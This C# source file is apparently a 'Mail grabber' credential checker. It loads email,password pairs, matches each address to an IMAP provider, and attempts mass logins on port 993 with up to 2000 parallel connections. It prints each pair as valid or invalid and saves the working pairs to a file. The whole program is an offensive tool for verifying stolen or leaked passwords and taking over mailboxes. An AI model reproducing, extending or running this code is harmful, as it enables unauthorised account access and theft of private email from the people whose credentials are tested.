using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;
using System.Net.Security;
using System.Threading;
using System.Windows.Forms;

namespace MailChecker
{
    class Program
    {
        const int port = 993;// secure SSL IMAP default port 993
        const string imap_file = "imap_servers.txt";
        const string author = "psch0";//if you change this you are wasted...
        const int MAX_PARALLELISM = 2000;
        static string CurrentPath = Path.GetDirectoryName(Application.ExecutablePath);


        static List<Credentials> accounts = new List<Credentials>();
        static List<string> imap_providers = new List<string>();

       


        static string[] logo =
        {
",--.   ,--.        ,--.,--.                          ,--.   ,--.",
"|   `.'   | ,--,--.`--'|  |     ,---. ,--.--. ,--,--.|  |-. |  |-.  ,---. ,--.--.",
"|  |'.'|  |' ,-.  |,--.|  |    | .-. ||  .--'' ,-.  || .-. '| .-. '| .-. :|  .--'",
"|  |   |  |\\ '-'  ||  ||  |    ' '-' '|  |   \\ '-'  || `-' || `-' |\\   --.|  |",
"`--'   `--' `--`--'`--'`--'    .`-  / `--'    `--`--' `---'  `---'  `----'`--'  ",  
"                               `---'"
        };

        

        static void Main(string[] args)
        {
            Console.Title = "Mail grabber";

            Console.ForegroundColor = ConsoleColor.White;


            if (args.Length == 0)
            {
                PrintLogo();
                Console.WriteLine("\nUsage:\r\n\n{0} [Input file]", System.AppDomain.CurrentDomain.FriendlyName);
                Console.WriteLine("\nExample:\r\n\n{0} accounts.csv", System.AppDomain.CurrentDomain.FriendlyName);
                Console.ReadKey();
                Environment.Exit(1);
            }
            else if (args.Length == 1)
            {
                String file = args[0].Replace("\"", "");//Replace quotes in-case file was dragged into Executable
                PrintLogo();
                LoadImap(imap_providers);
                LoadAccounts(file, accounts, ',');
                LoadProviders(accounts);

                Console.WriteLine("\nPress any key to scan {0} email accounts throughout IMAP Protocol....", accounts.Count);
                Console.ReadKey();

                Stopwatch watch = Stopwatch.StartNew();

                ExecuteLoop().GetAwaiter().GetResult();

                string elapsed_time_str = string.Format("Total time elapsed => {0:D2}:{1:D2}:{2:D2}.", (int)watch.Elapsed.TotalHours, (int)watch.Elapsed.TotalMinutes, (int)watch.Elapsed.TotalSeconds);
                DateTime date = DateTime.Today;
                string datestr = date.ToString("yyyy-MM-dd_hh_mm_ss");

                int valid_count = WriteLog(accounts, datestr);
                

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= FINISHED (^_^) -=-=-=-=-=-=-=-=-=-=-=-=");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\nValid accounts : {0}",  valid_count);
                Console.WriteLine(elapsed_time_str);
                Console.WriteLine("Valid accounts were written in file \"{0}", "Valid_" + datestr + ".txt\"");
                Console.ResetColor();
                Console.WriteLine("\nPress any key to exit.");
                Console.ReadKey();
            }
        }

        private static int WriteLog(List<Credentials> accs, string datestr)
        {
            int valid_count = 0;

            try
            {
                StreamWriter valid_f = new StreamWriter(CurrentPath + "\\" + "Valid_" + datestr + ".txt");

                for (int i = 0; i < accounts.Count; i++)
                {
                    if (accs[i].Status.Contains("OK"))
                    {
                        valid_f.WriteLine("{0};{1}", accs[i].Email, accs[i].Passw);
                        valid_f.Flush();
                        valid_count++;
                    }
                }

                valid_f.Close();
            }
            catch (IOException e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[Error] writing log file : {0}", e.Message);
                Console.ResetColor();
            }

            return valid_count;
        }

        static void PrintLogo()
        {
            Console.OutputEncoding = System.Text.Encoding.GetEncoding(1252);
            for (int i = 0; i < logo.Length; i++) Console.WriteLine(logo[i]);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Developed by {0}", author);
            Console.ResetColor();
        }

        static async Task ExecuteLoop()
        {
            int good = 0;
            int bad = 0;
            int j = 0;
            var obj = new object();
            int Count = accounts.Count;

            await RunWithMaxDegreeOfConcurrency(MAX_PARALLELISM, accounts, async i =>
            {
                try
                {

                    Imap imap = new Imap();

                    await imap.InitializeConnection(i.Provider, port);
                    Task<string> imapInit = imap.Response();

                    string initResp = await imapInit;

                    await imap.AuthenticateUser(i.Email, i.Passw);
                    Task<String> IAuth = (imap.Response());
                    string response = await IAuth;

                    i.Status = response;

                    lock (obj)
                    {
                        if (i.Status.Contains("OK"))
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.Out.WriteLineAsync(string.Format("{0}:{1} Valid [{2}/{3}/{4}]", i.Email, i.Passw, ++good, ++j, Count));

                            Console.ResetColor();
                        }
                        else
                        {
                            Console.ResetColor();
                            Console.Out.WriteLineAsync(string.Format("{0}:{1} Invalid [{2}/{3}/{4}]", i.Email, i.Passw, ++bad, ++j, Count));
                            Console.Out.WriteLineAsync(i.Provider);
                        }
                    }
                    await imap.Disconnect();
                }
                catch { }
            });
        }

        public static async Task RunWithMaxDegreeOfConcurrency<T>(
     int maxDegreeOfConcurrency, IEnumerable<T> collection, Func<T, Task> taskFactory)
        {
            var activeTasks = new List<Task>(maxDegreeOfConcurrency);

            foreach (var task in collection.Select(taskFactory))
            {
                activeTasks.Add(task);
                if (activeTasks.Count == maxDegreeOfConcurrency)
                {
                    await Task.WhenAny(activeTasks.ToArray());
                    //TODO:
                    activeTasks.RemoveAll(t => t.IsCompleted);
                }
            }

            await Task.WhenAll(activeTasks.ToArray()).ContinueWith(t =>
            {
                //TODO:
            });
        }

        static void LoadImap(List<String> imap)
        {
            try
            {
                StreamReader imap_r = new StreamReader(CurrentPath + "\\" + imap_file);

                string line;
                while ((line = imap_r.ReadLine()) != null)
                {
                    imap_providers.Add(line);
                }
            }
            catch (IOException ex) {
                Console.WriteLine("LoadImap(Error) : {0}", ex.Message);
                Console.ReadKey();
                Environment.Exit(123);
            }
        }

        static void LoadAccounts(string account_file, List<Credentials> c, char delimeter)
        {
            if (File.Exists(@account_file))
            {
                try
                {
                    StreamReader acc_file = new StreamReader(@account_file);
                    string line;
                    while ((line = acc_file.ReadLine()) != null)
                    {
                        Credentials acc = new Credentials();
                        try
                        {
                            acc.Email = line.Split(delimeter)[0];
                            acc.Passw = line.Split(delimeter)[1];
                            accounts.Add(acc);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[LoadAccounts error] : {0}", e.Message);
                            Console.ReadKey();
                            Environment.Exit(1337);
                        }
                    }
                }
                catch (IOException ex)
                {
                    Console.WriteLine("[LoadAccounts error] : {0}", ex.Message);
                    Console.ReadKey();
                    Environment.Exit(1337);
                }
            }
            else
            {
                Console.WriteLine("[LoadAccounts] file {0} doesn't exist.", account_file);
                Console.ReadKey();
                Environment.Exit(1337);
            }
        }

        static void LoadProviders(List<Credentials> c)
        {
            try
            {
                for (int i = 0; i < c.Count; i++)
                {
                    //imap.gmx.de
                    for (int j = 0; j < imap_providers.Count; j++)
                    {
                        int ix2 = imap_providers[j].LastIndexOf('.', imap_providers[j].LastIndexOf('.') - 1) + 1;

                        string res = imap_providers[j].Substring(ix2, imap_providers[j].Length - ix2);

                        if (c[i].Email.EndsWith(res) && imap_providers[j].Contains(res.Split('.')[0]))
                        {
                            c[i].Provider = imap_providers[j];
                            break;
                        }
                        else if(c[i].Email.Contains("hotmail.") || c[i].Email.Contains("live.") || c[i].Email.Contains("outlook."))
                        {
                            if(imap_providers[j].Contains("imap-mail.outlook.com"))
                            {
                                c[i].Provider = imap_providers[j];
                                break;
                            }
                        }
                        else if(c[i].Email.Contains("aol."))
                        {
                            if (imap_providers[j].Contains("imap.de.aol.com"))
                            {
                                c[i].Provider = imap_providers[j];
                                break;
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error adding providers to accounts (Reason): {0}", e.Message);
            }
        }
    }

    public class Credentials
    {
        public string Email;
        public string Passw;
        public string Provider = "imap.gmail.com";
        public string Status = "unknown";
    }
}
